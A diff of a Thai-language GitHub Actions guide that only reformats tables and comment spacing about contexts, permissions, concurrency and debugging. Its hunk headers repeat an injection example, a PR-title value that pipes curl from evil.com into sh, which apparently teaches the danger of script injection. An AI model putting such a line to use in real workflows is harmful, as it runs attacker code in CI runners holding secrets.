@@ -192,18 +192,18 @@ echo "หัวข้อ PR: "; curl evil.com/x.sh | sh; #"
 
 ## L2. Context — ตัวแปรมาจากไหนบ้าง
 
-| Context | คือ | ใช้ได้ที่ |
-| --- | --- | --- |
-| `github` | ข้อมูลของ event (sha, ref, actor, repository, event_name, run_id) | ทุกที่ |
-| `env` | ตัวแปรที่เราตั้งเอง | ทุกที่ยกเว้นบล็อก `env` ตัวเอง |
-| `vars` | Repository/Environment **Variables** (ไม่ลับ) | ทุกที่ |
-| `secrets` | Repository/Environment **Secrets** (ลับ) | `run`, `with`, `env` — **ใช้ใน `if:` ระดับ job ไม่ได้ในบางกรณี** |
-| `job` | สถานะ job ปัจจุบัน (`job.status`) | ภายใน job |
-| `steps` | ผลลัพธ์ของ step ก่อนหน้า (`steps.<id>.outputs.x`, `.outcome`, `.conclusion`) | หลัง step ที่มี `id` |
-| `needs` | outputs ของ job ที่รอ (`needs.build.outputs.digest`) | job ที่มี `needs` |
-| `inputs` | ค่าจาก `workflow_dispatch` หรือ `workflow_call` | ทุกที่ |
-| `matrix` | ค่าปัจจุบันของ matrix | job ที่มี strategy |
-| `runner` | `runner.os`, `runner.temp`, `runner.arch` | ภายใน job |
+| Context   | คือ                                                                          | ใช้ได้ที่                                                        |
+| --------- | ---------------------------------------------------------------------------- | ---------------------------------------------------------------- |
+| `github`  | ข้อมูลของ event (sha, ref, actor, repository, event_name, run_id)            | ทุกที่                                                           |
+| `env`     | ตัวแปรที่เราตั้งเอง                                                          | ทุกที่ยกเว้นบล็อก `env` ตัวเอง                                   |
+| `vars`    | Repository/Environment **Variables** (ไม่ลับ)                                | ทุกที่                                                           |
+| `secrets` | Repository/Environment **Secrets** (ลับ)                                     | `run`, `with`, `env` — **ใช้ใน `if:` ระดับ job ไม่ได้ในบางกรณี** |
+| `job`     | สถานะ job ปัจจุบัน (`job.status`)                                            | ภายใน job                                                        |
+| `steps`   | ผลลัพธ์ของ step ก่อนหน้า (`steps.<id>.outputs.x`, `.outcome`, `.conclusion`) | หลัง step ที่มี `id`                                             |
+| `needs`   | outputs ของ job ที่รอ (`needs.build.outputs.digest`)                         | job ที่มี `needs`                                                |
+| `inputs`  | ค่าจาก `workflow_dispatch` หรือ `workflow_call`                              | ทุกที่                                                           |
+| `matrix`  | ค่าปัจจุบันของ matrix                                                        | job ที่มี strategy                                               |
+| `runner`  | `runner.os`, `runner.temp`, `runner.arch`                                    | ภายใน job                                                        |
 
 **ความต่างที่คนสับสนบ่อยที่สุด — `outcome` vs `conclusion`:**
 
@@ -214,9 +214,9 @@ echo "หัวข้อ PR: "; curl evil.com/x.sh | sh; #"
 - run: echo "${{ steps.deploy.outcome }} / ${{ steps.deploy.conclusion }}"
 ```
 
-| | ความหมาย |
-| --- | --- |
-| `outcome` | ผลลัพธ์ **ก่อน** ใช้ `continue-on-error` — คือผลจริง ๆ |
+|              | ความหมาย                                                           |
+| ------------ | ------------------------------------------------------------------ |
+| `outcome`    | ผลลัพธ์ **ก่อน** ใช้ `continue-on-error` — คือผลจริง ๆ             |
 | `conclusion` | ผลลัพธ์ **หลัง** ใช้ `continue-on-error` — เป็น `success` แม้จะพัง |
 
 ใน `deploy-k8s.yml` เราใช้ `steps.rollout.outcome` เพราะต้องการรู้**ผลจริง** ไม่ใช่ผลที่ถูกกลบ
@@ -236,12 +236,12 @@ if: ${{ inputs.image-digest == '' }}          # ใส่ก็ได้ ผล�
 
 **2. status function ทั้ง 4 ตัว**
 
-| ฟังก์ชัน | รันเมื่อ |
-| --- | --- |
-| `success()` | ทุกอย่างก่อนหน้าสำเร็จ (ค่าเริ่มต้น) |
-| `failure()` | มีอะไรพัง |
-| `always()` | **เสมอ** แม้ workflow ถูกยกเลิก |
-| `cancelled()` | ถูกยกเลิกเท่านั้น |
+| ฟังก์ชัน      | รันเมื่อ                             |
+| ------------- | ------------------------------------ |
+| `success()`   | ทุกอย่างก่อนหน้าสำเร็จ (ค่าเริ่มต้น) |
+| `failure()`   | มีอะไรพัง                            |
+| `always()`    | **เสมอ** แม้ workflow ถูกยกเลิก      |
+| `cancelled()` | ถูกยกเลิกเท่านั้น                    |
 
 **3. `always()` อันตรายกว่าที่คิด** — มันทำให้ step รันแม้ผู้ใช้กด Cancel
 ถ้าต้องการแค่ "รันแม้ก่อนหน้าจะพัง" ให้ใช้ `if: !cancelled()` แทน จะปลอดภัยกว่า
@@ -275,11 +275,11 @@ echo "### หัวข้อ"  >> "$GITHUB_STEP_SUMMARY"  # แสดงบน�
 echo "/opt/bin"    >> "$GITHUB_PATH"          # เพิ่มลงใน PATH
 ```
 
-| | ใช้ได้ถึงไหน | ต้องมี `id` ไหม |
-| --- | --- | --- |
-| `GITHUB_OUTPUT` | step อื่นใน **job เดียวกัน** | ✅ ต้องมี |
-| `GITHUB_ENV` | step ถัดไปใน job เดียวกัน | ❌ |
-| `GITHUB_STEP_SUMMARY` | แสดงผลอย่างเดียว | ❌ |
+|                       | ใช้ได้ถึงไหน                 | ต้องมี `id` ไหม |
+| --------------------- | ---------------------------- | --------------- |
+| `GITHUB_OUTPUT`       | step อื่นใน **job เดียวกัน** | ✅ ต้องมี       |
+| `GITHUB_ENV`          | step ถัดไปใน job เดียวกัน    | ❌              |
+| `GITHUB_STEP_SUMMARY` | แสดงผลอย่างเดียว             | ❌              |
 
 **ข้ามไป job อื่นต้องประกาศ `outputs` ที่ระดับ job:**
 
@@ -287,7 +287,7 @@ echo "/opt/bin"    >> "$GITHUB_PATH"          # เพิ่มลงใน PATH
 jobs:
   build:
     outputs:
-      digest: ${{ steps.build.outputs.digest }}   # ← ยกจาก step ขึ้นมาระดับ job
+      digest: ${{ steps.build.outputs.digest }} # ← ยกจาก step ขึ้นมาระดับ job
   deploy:
     needs: build
     steps:
@@ -331,11 +331,11 @@ jobs:
     ...
 ```
 
-| flag | ทำอะไร |
-| --- | --- |
-| `-e` | เจอคำสั่งที่ exit ไม่เป็น 0 → หยุดทันที |
-| `-u` | ใช้ตัวแปรที่ไม่ได้ตั้ง → error (จับ typo ได้ดีมาก) |
-| `-o pipefail` | ใน pipeline ถ้าตัวไหนพัง ถือว่าทั้งบรรทัดพัง |
+| flag          | ทำอะไร                                             |
+| ------------- | -------------------------------------------------- |
+| `-e`          | เจอคำสั่งที่ exit ไม่เป็น 0 → หยุดทันที            |
+| `-u`          | ใช้ตัวแปรที่ไม่ได้ตั้ง → error (จับ typo ได้ดีมาก) |
+| `-o pipefail` | ใน pipeline ถ้าตัวไหนพัง ถือว่าทั้งบรรทัดพัง       |
 
 **ข้อยกเว้นที่ `-e` ไม่ทำงาน** (ต้องรู้ ไม่งั้นจะงง):
 
@@ -399,13 +399,13 @@ jobs:
 
 **ข้อจำกัดที่ต้องรู้:**
 
-| ข้อ | รายละเอียด |
-| --- | --- |
-| ใส่ `steps` ในตัวที่เรียกไม่ได้ | job ที่มี `uses` จะมีแค่ `with`/`secrets`/`needs`/`if` |
-| ส่งค่ากลับต้องผ่าน `outputs` ของ workflow | ต้องประกาศ 2 ชั้น: step → job → workflow |
-| `secrets: inherit` ส่งทุก secret ให้ | ถ้าอยากคุมให้ระบุทีละตัวแทน |
-| ซ้อนได้ลึกสุด 4 ชั้น | |
-| `env` ระดับ workflow ของผู้เรียก **ไม่ถูกส่งต่อ** | ต้องส่งผ่าน `with:` |
+| ข้อ                                               | รายละเอียด                                             |
+| ------------------------------------------------- | ------------------------------------------------------ |
+| ใส่ `steps` ในตัวที่เรียกไม่ได้                   | job ที่มี `uses` จะมีแค่ `with`/`secrets`/`needs`/`if` |
+| ส่งค่ากลับต้องผ่าน `outputs` ของ workflow         | ต้องประกาศ 2 ชั้น: step → job → workflow               |
+| `secrets: inherit` ส่งทุก secret ให้              | ถ้าอยากคุมให้ระบุทีละตัวแทน                            |
+| ซ้อนได้ลึกสุด 4 ชั้น                              |                                                        |
+| `env` ระดับ workflow ของผู้เรียก **ไม่ถูกส่งต่อ** | ต้องส่งผ่าน `with:`                                    |
 
 **การส่ง output กลับ 2 ชั้น** — นี่คือส่วนที่คนงงที่สุด:
 
@@ -415,11 +415,11 @@ on:
   workflow_call:
     outputs:
       digest:
-        value: ${{ jobs.build.outputs.digest }}   # ชั้น 2: job → workflow
+        value: ${{ jobs.build.outputs.digest }} # ชั้น 2: job → workflow
 jobs:
   build:
     outputs:
-      digest: ${{ steps.build.outputs.digest }}   # ชั้น 1: step → job
+      digest: ${{ steps.build.outputs.digest }} # ชั้น 1: step → job
 ```
 
 ---
@@ -429,12 +429,12 @@ jobs:
 `GITHUB_TOKEN` ถูกสร้างใหม่ทุก run และหมดอายุเมื่อ run จบ สิทธิ์ของมันควบคุมด้วย `permissions:`
 
 ```yaml
-permissions:          # ระดับ workflow — ใช้กับทุก job
+permissions: # ระดับ workflow — ใช้กับทุก job
   contents: read
 
 jobs:
   build:
-    permissions:      # ระดับ job — เขียนทับของ workflow ทั้งชุด
+    permissions: # ระดับ job — เขียนทับของ workflow ทั้งชุด
       contents: read
       packages: write
 ```
@@ -444,11 +444,11 @@ jobs:
 
 ในโปรเจกต์นี้:
 
-| workflow | permissions | เหตุผล |
-| --- | --- | --- |
-| `ci.yml` | `contents: read` | รันบ่อยที่สุด → ให้สิทธิ์น้อยที่สุด |
-| `build-push.yml` | `contents: read`, `packages: write` | ต้อง push image |
-| `deploy-*.yml` | เท่ากับข้างบน | ตัว deploy ใช้ secret คนละชุด ไม่ใช่ GITHUB_TOKEN |
+| workflow         | permissions                         | เหตุผล                                            |
+| ---------------- | ----------------------------------- | ------------------------------------------------- |
+| `ci.yml`         | `contents: read`                    | รันบ่อยที่สุด → ให้สิทธิ์น้อยที่สุด               |
+| `build-push.yml` | `contents: read`, `packages: write` | ต้อง push image                                   |
+| `deploy-*.yml`   | เท่ากับข้างบน                       | ตัว deploy ใช้ secret คนละชุด ไม่ใช่ GITHUB_TOKEN |
 
 ---
 
@@ -462,10 +462,10 @@ concurrency:
 
 `group` คือ "คิว" — run ที่อยู่ group เดียวกันจะไม่ทำงานพร้อมกัน
 
-| งาน | `cancel-in-progress` | เหตุผล |
-| --- | --- | --- |
-| test / lint / build | `true` | อ่านอย่างเดียว ยกเลิกได้ ไม่ทิ้งอะไรค้าง |
-| **deploy** | **`false`** | ยกเลิกกลางทาง = คลัสเตอร์ค้างในสถานะครึ่ง ๆ กลาง ๆ |
+| งาน                 | `cancel-in-progress` | เหตุผล                                             |
+| ------------------- | -------------------- | -------------------------------------------------- |
+| test / lint / build | `true`               | อ่านอย่างเดียว ยกเลิกได้ ไม่ทิ้งอะไรค้าง           |
+| **deploy**          | **`false`**          | ยกเลิกกลางทาง = คลัสเตอร์ค้างในสถานะครึ่ง ๆ กลาง ๆ |
 
 สังเกตว่า `deploy-k8s.yml` ใช้ `group: deploy-k8s` **โดยไม่มี `${{ github.ref }}`**
 จงใจ — เพื่อให้ deploy จากทุก ref เข้าคิวเดียวกัน จะได้ไม่มีสอง deploy ยิงเข้าคลัสเตอร์พร้อมกัน
@@ -475,9 +475,9 @@ concurrency:
 ## L10. เครื่องมือ debug
 
 ```yaml
-- run: echo '${{ toJSON(github) }}'      # ดู context ทั้งก้อน
-- run: echo '${{ toJSON(needs) }}'       # ดูว่า job ก่อนหน้าส่งอะไรมา
-- run: env | sort                        # ดู env ทั้งหมด (ระวัง secret)
+- run: echo '${{ toJSON(github) }}' # ดู context ทั้งก้อน
+- run: echo '${{ toJSON(needs) }}' # ดูว่า job ก่อนหน้าส่งอะไรมา
+- run: env | sort # ดู env ทั้งหมด (ระวัง secret)
 ```
 
 เปิด debug log แบบละเอียด: ตั้ง repository secret `ACTIONS_STEP_DEBUG` = `true`
